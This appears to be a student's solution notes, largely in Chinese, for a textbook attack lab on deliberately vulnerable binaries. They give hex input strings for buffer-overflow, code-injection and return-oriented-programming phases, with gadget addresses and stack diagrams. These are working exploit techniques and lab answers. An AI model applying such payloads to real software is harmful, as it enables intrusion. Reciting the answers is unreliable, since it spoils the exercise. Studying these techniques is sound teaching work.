0000000000401eb4 <launch>:
0000000000401968 <test>:
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp   40

00000000004017c0 <touch1>:
由实验说明和反编译代码可知，
通过溢出buf，改写后续代码，让ret指令读取touch1的地址
需用hex2raw转译为二进制
cat ctarget11.txt | ./hex2raw | ./ctarget -q

ctarget phase_1
31 32 33 34 35 36 37 38 39 3a
31 32 33 34 35 36 37 38 39 3a
31 32 33 34 35 36 37 38 39 3a
31 32 33 34 35 36 37 38 39 3a
c0 17 40 00 00 00 00 00

-----------------------------------------------------

00000000004017ec <touch2>:

需要把cookie值存入变量传递给touch2，再跳转到touch2
采用ret指令跳回buf区，执行改写的代码
注意追踪rsp的位置变化

movq $0x59b997fa,%rdi
pushq $0x004017ec
retq

ctarget phase_2
48 c7 c7 fa 97 b9 59 68 ec 17
40 00 c3 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00

-----------------------------------------------------

00000000004018fa <touch3>:
000000000040184c <hexmatch>:

touch3读取字符串指针，函数内部传递cookie和指针到hexmatch，

getbuf的栈帧被输入值占用
hexmatch设置rsp~rsp+128的栈帧，对rsp~rsp+100的区域有随机数据写入，造成原有数据破坏
因不需考虑对其他函数栈帧的破坏，可考虑把跳转地址放置在test函数的栈帧（即getbuf栈帧外）
rsp 5561dc78 + 0x28 = 5561dca0
0x59b997fa -> 35 39 62 39 39 37 66 61 00

movq $0x5561dca8,%rdi
pushq $0x4018fa
retq
ctarget phase_3
48 c7 c7 a8 dc 61 55 68 fa 18
40 00 c3 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00

------------------------------------------------------

rtarget phase_1

参考ctarget phase_2的操作，本想找对应的16进制模式，
但发现要找到一模一样的cookie值传给函数很成问题。
仔细翻阅实验说明，发现有pop指令，对应start_farm到mid_farm的代码区有多个58 9X c3模式，
因90代表nop指令，借用代码区多次出现的48 89 c7，配合栈帧数据和跳转，完成ROP攻击

4019cc
popq %rax
nop
ret

4019a2
movq %rax,%rdi
ret

30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

-----------------------------------------------------

phase_2

参考ctarget phase_3的思路，其实就两三步的操作。
但受限于可用的代码模式，需要按思路拼凑出相应的代码，
整个需要循环试错，迭代几次版本才能找出比较合适的操作。
需要考虑的因素包括：
cookie string需要放在不被改写的地方，
用已有的代码做好数据的衔接，
要执行一连串的操作必然导致栈帧加长，
leaq计算字符串位置需要考虑相对距离,
在试错的过程需要一直跟踪rsp的变化来调整gadget在栈帧中的位置

最终版本：
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
ab 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00

assembly                hex         addr        gadget No.
movq rsp,rax            48 89 e0    401a06      1
movq rax,rdi            48 89 c7    4019c5      2
popq rax                58          4019ab      3
movl eax,edx            89 c2       4019dd      4
movl edx,ecx            89 d1       401a69      5
movl ecx,esi            89 ce       401a13      6
leaq (rdi,rsi,1),rax    ----        4019d6      7
movq rax,rdi            ----        ------      2

stake frame
|   str     |
|   touch3  |
|   (2)     |
|   (7)     |
|   (2)     |  ___ pass current rsp
|   (1)     |
|   (6)     |
|   (5)     |
|   (4)     |
|  offset   |
|   (3)     |
|  padding  |
|  padding  |
|  padding  |
|  padding  |
|  padding  |

对gadget的顺序有作调整，让rsp取值时尽量靠近str的位置
注意：
偏移量是0x20(32),而不是0x28。
因为gadget6 ret后，gadget1的地址出栈传给rip。
gadget1运行时，rsp实际已在图示位置。与cookie string的距离是32 Byte
